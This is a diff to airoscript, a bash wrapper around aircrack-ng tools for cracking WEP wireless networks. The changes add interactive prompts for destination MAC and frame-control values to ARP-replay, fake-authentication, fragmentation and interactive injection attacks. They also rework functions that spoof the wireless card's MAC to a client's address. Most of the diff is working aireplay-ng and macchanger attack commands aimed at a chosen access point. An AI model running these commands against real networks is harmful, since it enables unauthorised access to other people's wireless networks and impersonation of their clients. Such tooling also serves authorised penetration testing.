@@ -37,6 +37,7 @@ if [ "$UNSTABLE" = "1" ]; then
 else
 	echo -e "`gettext '  ##__________________________________##\n'`"
 fi
+	echo ""
 }
 
 ##################################################################################
@@ -460,7 +461,7 @@ function witchattack {
 	  read yn
 	  echo ""
 	  case $yn in
-	    1 ) attack ;$CLEAR; break ;;
+	    1 ) fakeautoattack ; break ;;
 	    2 ) fakeinteractiveattack;$CLEAR ; break ;;
 	    3 ) fragnoclient ;$CLEAR; break ;;
 	    4 ) chopchopattack ;$CLEAR; break ;;
@@ -479,13 +480,36 @@ function witchattack {
 	}
 		# Subproducts of attackwep function:
 
-		#Ooption 1 (fake auth auto)
-		function attack {
-			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext \"Injection: Host: $Host_MAC\"`" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & fakeauth3 & menufonction
+		#Option 1 (fake auth auto)
+		function fakeautoattack {
+			if [ "$INTERACTIVE" ] # More interactive airoscript.
+			then
+				
+				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
+					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
+				read -p "`gettext \"Enable From or To destination bit (f/t):  \"`" FT 
+					if [ "$FT" = "" ]; then FT="f"; fi
+			else
+				INJMAC="FF:FF:FF:FF:FF:FF"
+				FT="f"
+			fi
+
+			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext \"Injection: Host: $Host_MAC\"`" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & choosefake
+
 		}
 		#Option 2 (fake auth interactive)
 		function fakeinteractiveattack {
-			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG  "`gettext 'Interactive Packet Sel on Host: $Host_SSID'`" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & fakeauth3 & menufonction
+			if [ "$INTERACTIVE" ] # More interactive airoscript.
+			then
+				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
+					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
+				read -p "`gettext \"Set framecontrol word (hex): (0841) \"`" FT 
+					if [ "$FT" = "" ]; then FT="0841"; fi
+			else
+				INJMAC="FF:FF:FF:FF:FF:FF"
+				FT="0841"
+			fi
+			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG  "`gettext 'Interactive Packet Sel on Host: $Host_SSID'`" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & choosefake 
 		}
 
 		#Option 3 (fragmentation attack)
@@ -494,7 +518,7 @@ function witchattack {
 			rm -rf $DUMP_PATH/frag_*.cap
 			rm -rf $DUMP_PATH/$Host_MAC*
 			killall -9 airodump-ng aireplay-ng # FIXME Is this a good idea? I think we should save pids of what we launched, and then kill them.
-		$CDCMD $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG  "`gettext  \"Fragmentation attack on $Host_SSID\"` " $EXECFLAG $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture & fakeauth3 &  injectmenu
+		$CDCMD $TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG  "`gettext  \"Fragmentation attack on $Host_SSID\"` " $EXECFLAG $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $IWIFI & capture & choosefake &  injectmenu
 			}
 
 		#Option 4 (chopchopattack)
@@ -516,13 +540,32 @@ function witchattack {
 
 		#Option 7 (Auto arp replay)
 		function attackclient {
-			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Injection:'` `gettext 'Host'` : $Host_MAC `gettext 'Client'` : $Client_MAC" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE & menufonction
+			if [ "$INTERACTIVE" ] # More interactive airoscript.
+			then
+				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
+					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
+				read -p "`gettext 'Enable From or To destination bit (f/t):  '`" FT 
+					if [ "$FT" = "" ]; then FT="f"; fi
+			else
+				INJMAC="FF:FF:FF:FF:FF:FF"
+				FT="f"
+			fi
+			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Injection:'` `gettext 'Host'` : $Host_MAC `gettext 'Client'` : $Client_MAC" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE & menufonction
 		}
 
 		#Option 8 (interactive arp replay) 
-
 		function interactiveattack {
-			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Interactive Packet Sel on:'` $Host_SSID" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC $Client_MAC -x $INJECTRATE & menufonction
+			if [ "$INTERACTIVE" ] # More interactive airoscript.
+			then
+				read -p "`gettext 'Enter destination mac: (FF:FF:FF:FF:FF:FF)'`" INJMAC
+					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
+				read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT 
+					if [ "$FT" = "" ]; then FT="0841"; fi
+			else
+				INJMAC="FF:FF:FF:FF:FF:FF"
+				FT="0841"
+			fi
+			capture & $CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Interactive Packet Sel on:'` $Host_SSID" $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG $AIREPLAY $IWIFI --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE & menufonction
 		}
 
 		#Option 9 (fragmentation attack)
@@ -752,6 +795,7 @@ Option: '`"
 fi
 }
 
+
 # Those are subproducts of choosefake
 	function fakeauth1 {
 		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Associating with:'` $Host_SSID " $BOTTOMRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$ASSOCIATION_COLOR" $EXECFLAG $AIREPLAY --fakeauth 6000 -o 1 -q 10 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI & menufonction
@@ -851,7 +895,7 @@ Option: '`"
 	1 ) inject_test ; $CLEAR; break ;;
 	2 ) setinterface2 ; $ClEAR; break ;;
 	3 ) cleanup ;$CLEAR; break ;; 
-	4 ) wichchangemac ;$CLEAR; break ;;
+	4 ) wichchangemac ; $CLEAR; break ;;
 	5 ) choosemdk ;$CLEAR; break;;
 	6 ) choosewesside ;$CLEAR; break ;;
 	7 ) monitor_interface;$CLEAR ; break ;;
@@ -927,9 +971,9 @@ Option: '`"
 			read yn
 			
 			case $yn in
-				1 ) fakemacchanger ; break ;;
-				2 ) macchanger ; break ;;
-				3 ) macinput ; break ;;
+				1 ) fakemacchanger ;$CLEAR; break ;;
+				2 ) macchanger ;$CLEAR; break ;;
+				3 ) macinput ; $CLEAR; break ;;
 				* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
 			esac
 		done 
@@ -955,34 +999,20 @@ Option: '`"
 			# And those from fakemacchanger
 			function fakechangemacrausb {
 				ifconfig $WIFICARD down
-				$iwconfig $WIFICARD mode managed
-				sleep 2
-				macchanger -m $FAKE_MAC $WIFICARD
+				$MACCHANGER -m  $FAKE_MAC $WIFICARD
 				ifconfig $WIFICARD up
-				$iwconfig $WIFICARD mode monitor			
 			}
 	
 			function fakechangemacwlan {
-				echo -n "Shutting down interface..." 
 				ifconfig $WIFICARD down
-				echo -e "Done\n Putting in mode managed"
-				$iwconfig $WIFICARD mode managed
-				sleep 2
-				echo -n "Changing mac with macchanger..."
-				macchanger -m $FAKE_MAC $WIFICARD
-				echo "Done"
-				echo "Putting in mode monitor interface "
+				$MACCHANGER -m  $FAKE_MAC $WIFICARD
 				ifconfig $WIFICARD up
-				$iwconfig $WIFICARD mode monitor		
 			}
 			
 			function fakechangemacath {
 				ifconfig $WIFICARD down
-				$iwconfig $WIFICARD mode managed
-				sleep 2
-				macchanger -m $FAKE_MAC $WIFICARD
+				$MACCHANGER -m  $FAKE_MAC $WIFICARD
 				ifconfig $WIFICARD up
-				$iwconfig $WIFICARD mode monitor			
 			}
 		
 	
@@ -1008,29 +1038,23 @@ Option: '`"
 			# Those are part of macchanger
 			function changemacrausb {
 				ifconfig $WIFICARD down
-				$iwconfig $WIFICARD mode managed
 				sleep 2
-				macchanger -m $Client_MAC $WIFICARD
+				$MACCHANGER -m  $Client_MAC $WIFICARD
 				ifconfig $WIFICARD up
-				$iwconfig $WIFICARD mode monitor			
 			}
 			
 			function changemacwlan {
 				ifconfig $WIFICARD down
-				$iwconfig $WIFICARD mode managed
 				sleep 2
-				macchanger -m $Client_MAC $WIFICARD
+				$MACCHANGER -m  $Client_MAC $WIFICARD
 				ifconfig $WIFICARD up
-				$iwconfig $WIFICARD mode monitor			
 			}
 			
 			function changemacath {
 				ifconfig $WIFICARD down
-				$iwconfig $WIFICARD mode managed
 				sleep 2
-				macchanger -m $Client_MAC $WIFICARD
+				$MACCHANGER -m  $Client_MAC $WIFICARD
 				ifconfig $WIFICARD up
-				$iwconfig $WIFICARD mode monitor			
 			}
 			
 		function macinput {
@@ -1062,29 +1086,20 @@ Option: '`"
 			# I suppose all this code if for precaution. I mean, if sometime the method differes between the different kind of cards, or if we've got to add a new card with a differente method.
 				function manualchangemacrausb {
 					ifconfig $WIFICARD down
-					$iwconfig $WIFICARD mode managed
-					sleep 2
-					macchanger -m $Client_MAC $WIFICARD
+					$MACCHANGER -m  $Client_MAC $WIFICARD
 					ifconfig $WIFICARD up
-					$iwconfig $WIFICARD mode monitor			
 				}
 
 				function manualchangemacwlan {
 					ifconfig $WIFICARD down
-					$iwconfig $WIFICARD mode managed
-					sleep 2
-					macchanger -m $Client_MAC $WIFICARD
+					$MACCHANGER -m  $Client_MAC $WIFICARD
 					ifconfig $WIFICARD up
-					$iwconfig $WIFICARD mode monitor				
 				}
 
 				function manualchangemacath {
 					ifconfig $WIFICARD down
-					$iwconfig $WIFICARD mode managed
-					sleep 2
-					macchanger -m $Client_MAC $WIFICARD
+					$MACCHANGER -m  $Client_MAC $WIFICARD
 					ifconfig $WIFICARD up
-					$iwconfig $WIFICARD mode monitor				
 				}
 
 	# 5. 
@@ -1181,17 +1196,17 @@ Option: '`"
 			while true; do
 				$CLEAR
 				echo -e -n "`gettext '
-			_____________________________________
-			##   Choose Wesside-ng Options     ##
-			##                                 ##
-			##   1) No arguments               ##
-			##   2) Selected target            ##
-			##   3) Sel. target max rertransmit #
-			##   4) Sel. target poor connection #
-			##   5) Select another target      ##
-			##   6) Return to main menu        ##
-			##_________________________________##
-				Option: '`"
+	_____________________________________
+	##   Choose Wesside-ng Options     ##
+	##                                 ##
+	##   1) No arguments               ##
+	##   2) Selected target            ##
+	##   3) Sel. target max rertransmit #
+	##   4) Sel. target poor connection #
+	##   5) Select another target      ##
+	##   6) Return to main menu        ##
+	##_________________________________##
+		Option: '`"
 			
 				read yn
 
@@ -1437,7 +1452,7 @@ Option: '`"
 		$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Sending chopchop to:'` $Host_SSID" $EXECFLAG $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $IWIFI & menufonction
 		fi
 	}
-
+# FIXME: From here, I have not developed more "airoscript interactive"
 ###########################################
 ########Those three are called from many places.#########
 ###########################################
@@ -1516,6 +1531,21 @@ function doauto {
 ###########################################
 #############Called directly from the menu.###########
 ###########################################
+
+function checkforcemac
+if [ $FORCE_MAC_ADDRESS ]; then
+	$CLEAR
+	echo "Warn: Not checking mac address"
+	menu
+else
+	echo -ne "Checking mac address...done"
+	mac=`$MACCHANGER -s wlan0|awk {'print $3'}`
+	if [ "$FAKE_MAC" != "$mac" ]; then
+		wichchangemac
+		$CLEAR
+		menu
+	fi
+fi
 function setinterface {
 	#INTERFACES=`$iwconfig|grep --regexp=^[^:blank:].[:alnum:]|awk '{print $1}'`
 	#INTERFACES=`$iwconfig|egrep "^[a-Z]+[0-9]+" |awk '{print $1}'`
@@ -1746,6 +1776,10 @@ function setterminal {
 			. $SCREEN_FUNCTIONS
 			echo "Screen functons loaded, replacing functions"
 			;;
+		airosperl ) 
+			airosperl
+			exit
+			;;
 
 	esac
 }
@@ -1753,12 +1787,13 @@ function setterminal {
 
 # this function allows debugging, called from main menu.
 function debug {
-	if [ $DEBUG = 1 ]
+	if [ "$DEBUG" = "1" ]
 	then
+		export HOLD=$HOLDFLAG
 		echo "`gettext \" 	Debug Mode enabled, you\'ll have to manually close windows\"`"
-		HOLD=$HOLDFLAG
+		
 	else
-		HOLD=""
+		export HOLD=""
 	fi
 }
 
@@ -1766,14 +1801,18 @@ function getterminal {
 	# TERMINAL var is on config if valid, use it, if not set it to defaults, if that fails, use environment terminal, and if that fails too, use xterm :-D, if xterm isnt available, giva a fatal warning and exit (who doesnt have a terminal?)
 
 # This is for parameter input.
-	if [ -x $TERMBIN/$TERMINAL ]
-	then
-		echo -en "\t`gettext \"Using configured terminal\"`"
+	if [ "$TERMINAL" = "GUI" ]; then
+		TERMINAL="airosperl"
 	else
-		echo -en "$TERMINAL was not used, not found on path"
-		echo -en '`gettext "Using default terminal"`' 
-		TERMINAL=`ls -l1 /etc/alternatives/x-terminal-emulator|cut -d ">" -f 2|cut -d " " -f 2|head -n1`;        
-	fi      
+		if [ -x $TERMBIN/$TERMINAL ]
+		then
+			echo -en "\t`gettext \"Using configured terminal\"`"
+		else
+			echo -en "$TERMINAL was not used, not found on path"
+			echo -en '`gettext "Using default terminal"`' 
+			TERMINAL=`ls -l1 /etc/alternatives/x-terminal-emulator|cut -d ">" -f 2|cut -d " " -f 2|head -n1`;        
+		fi      
+	fi
                 
 	if [ -x $TERMBIN/$TERMINAL ] # If there is an alternative for terminal select it.
 	then    
